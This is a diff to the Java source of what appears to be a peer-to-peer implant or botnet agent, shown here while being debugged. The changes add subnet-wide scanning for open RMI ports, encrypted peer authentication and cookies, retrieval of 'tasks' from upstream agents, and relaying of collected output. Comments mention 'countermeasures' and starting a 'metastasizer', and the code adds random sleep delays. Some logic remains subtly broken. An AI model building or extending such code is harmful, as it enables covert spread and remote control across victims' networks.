@@ -108,11 +108,12 @@ public class Main
     static public Hashtable downstreamAgents = new Hashtable();
     static public ArrayList output = new ArrayList();
     static private countermeasures cm = new countermeasures();
-    static private utilitarian nUtil = new utilitarian();
+    static public utilitarian nUtil = new utilitarian();
     static private pkgLib packager = new pkgLib();
     static private nConfig config = new nConfig();
     static public network nComm = new network();
     static public P2PInterface ifaceP2P = null;
+    static private security secInst = new security();
 
     public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
@@ -132,7 +133,7 @@ public class Main
         //start loop
         //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
         //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
-        nComm.findP2P();
+        p2pList = nComm.findP2P();
 
         if (p2pList.size() > 0)
         {
@@ -171,30 +172,39 @@ public class Main
                     //
 
                     //add logic on tasking to allow for multiple upstreams
-                    config.upstreamHost = p2pList.get(c);
-                    P2PInterface ifaceP2P = nComm.initP2PInterface();
+                    config.upstreamHost = (String) p2pList.get(c);
+
+                    ArrayList ifaceP2PRaw = nComm.initP2PInterface();
+
+                    if (!((String) ifaceP2PRaw.get(0)).equals("null"))
+                    {
+                        continue;
+                    }
+
+                    P2PInterface ifaceP2P = (P2PInterface) ifaceP2PRaw.get(1);
+                    String ephemeralNonce = nUtil.strand(12);
 
                     String passwdEncoded = new String(
                         Base64.getEncoder().encode(
                             secInst.encrypt(
                                 config.passMat.getBytes(),
                                 config.defaultKey.getBytes(), 
-                                downstreamNonce.getBytes()
+                                ephemeralNonce.getBytes()
                             )
                         )
                     );
 
-                    Hashtable authData = ifaceP2P.auth(sessUUID,passwdEncoded,nUtil.strand(12));
+                    Hashtable authData = ifaceP2P.auth(sessUUID,passwdEncoded,ephemeralNonce);
 
-                    cookieData = authData.get("cookie");
+                    String cookieEncrypted = authData.get("cookie").toString();
                     tasks = (ArrayList) authData.get("tasks");
 
                     config.encKey = new String(
-                        Base64.getDecoder().encode(
+                        Base64.getDecoder().decode(
                             secInst.decrypt(
                                 cookieEncrypted.getBytes(),
                                 config.defaultKey.getBytes(), 
-                                downstreamNonce.getBytes()
+                                ephemeralNonce.getBytes()
                             )
                         )
                     );
@@ -257,7 +267,7 @@ public class Main
             Hashtable taskObj = (Hashtable) tasks.get(t);
             tasks.remove(t);
 
-            if (!taskObj.keySet().contains(uuid))
+            if (!taskObj.keySet().contains(sessUUID))
             {
                 continue;
             }
@@ -329,7 +339,7 @@ public class Main
                 try {
                     TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,7))*1000);
                     Document outData = (Document) output.get(d);
-                    if (isDownstream == 1) 
+                    if (config.isDownstream == 1) 
                     {
                         ifaceP2P.put(sessUUID,cookieData,nUtil.strand(12),output);
                     }
@@ -403,6 +413,17 @@ public class Main
 		    int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
 		    return randNum;
 	    }
+
+		public String strand(int strLen) throws NoSuchAlgorithmException {
+			//random string, for nonces and such
+			String asciiChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+			StringBuilder randStr = new StringBuilder();
+			for (int x=0; x<strLen; x++) {
+				SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
+				randStr.append(asciiChars.charAt(rHandle.nextInt(asciiChars.length())));
+			}
+			return randStr.toString();
+		}
 
         private ArrayList getClassByName(String className)
         {
@@ -561,7 +582,7 @@ public class Main
         }
     }
 
-    public class P2PServer
+    public static class P2PServer
     {
         public void rmiServer()
         {
@@ -576,22 +597,24 @@ public class Main
     public interface P2PInterface extends Remote
     {
         //creates cookie session object and adds uuid to downstream agents
-        public Hashtable auth(String uuid, String passwd) throws RemoteException;
+        public Hashtable auth(String uuid, String passwd, String nonce) throws RemoteException;
         public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException;
         //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
         public String disconnect(String uuid, String cookie, String nonce) throws RemoteException;
     }
 
-    public class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
-    {        
-        protected P2PSrvImpl() throws RemoteException
+    public static class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
+    {
+
+        P2PSrvImpl() throws RemoteException
         {
             super();
         }
 
-        @Override
         public Hashtable auth(String uuid, String passwd, String downstreamNonce) throws RemoteException
         {
+            security secInst = new security();
+            Hashtable authData = new Hashtable();
             String currentKey;
             if (downstreamAgents.containsKey(uuid))
             {
@@ -613,7 +636,7 @@ public class Main
             );
             if (authBlob.equals(config.passMat))
             {
-                Hashtable authData = new Hashtable();
+
                 ArrayList taskData = new ArrayList();
                 for (int t=0;t<tasks.size();t++)
                 {
@@ -649,13 +672,14 @@ public class Main
             }
             else
             {
-                return "null";
+                authData.put("error","invalid auth");
+                return authData;
             }
         }
 
-        @Override
         public String put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws RemoteException
         {
+            security secInst = new security();
             String authBlob = new String(
                 Base64.getDecoder().decode(
                     secInst.decrypt(
@@ -679,9 +703,9 @@ public class Main
             }
         }
 
-        @Override
         public String disconnect(String uuid, String cookie, String downstreamNonce) throws RemoteException
         {
+            security secInst = new security();
             String authBlob = new String(
                 Base64.getDecoder().decode(
                     secInst.decrypt(
@@ -705,6 +729,7 @@ public class Main
 
         public String mkCookie(String uuid, String passMat)
         {
+            utilitarian nUtil = new utilitarian();
             String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
 			Hashtable cookieMaterialRaw = new Hashtable();
 
@@ -722,7 +747,7 @@ public class Main
     }
 
 
-    class network
+    public static class network
     {
         public ArrayList initP2PInterface()
         {
@@ -737,11 +762,12 @@ public class Main
                     )
                 );
 
-                retrList.add("null",regRemote);
+                retrList.add("null");
+                retrList.add(regRemote);
             }
             catch (Exception e)
             {
-                retrList.add(e.getMessage());
+                retrList.add(String.format("error: %s",e.getMessage()));
             }
             return retrList;
         }
@@ -753,7 +779,7 @@ public class Main
             {
                 try (Socket socket = new Socket()) 
                 {
-                    String host = addresses.get(h);
+                    String host = (String) addresses.get(h);
                     socket.connect(new InetSocketAddress(host, config.upstreamPort), 1000);
                     localNodes.add(host);
                     socket.close();
@@ -769,21 +795,21 @@ public class Main
         public ArrayList calcSubnetAddrs(ArrayList ipAddresses)
         {
             ArrayList subnetAddrs = new ArrayList();
-            for (int a=0;a<ipAddress.size();a++)
+            for (int a=0;a<ipAddresses.size();a++)
             {
-                String[] prefix = ipAddresses.get(a).split(".");
+                String[] prefix = ((String) ipAddresses.get(a)).split(".");
                 for (int o=1; o<255; o++)
                 {
                     if (o != Integer.valueOf(prefix[3]))
                     {
-                        subnetAddrs.add(String.join(".",prefix[0],prefix[1],prefix[2],String.valueof(o)));
+                        subnetAddrs.add(String.join(".",prefix[0],prefix[1],prefix[2],String.valueOf(o)));
                     }
                 }
             }
             return subnetAddrs;
         }
 
-        public void findP2P()
+        public ArrayList findP2P()
         {
             ArrayList ipAddresses = new ArrayList();
 
@@ -803,7 +829,7 @@ public class Main
             }
 
             ArrayList netAddresses = calcSubnetAddrs(ipAddresses);
-            nCore.p2pList = findOpenRMI(netAddresses);
+            return findOpenRMI(netAddresses);
         }
 
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
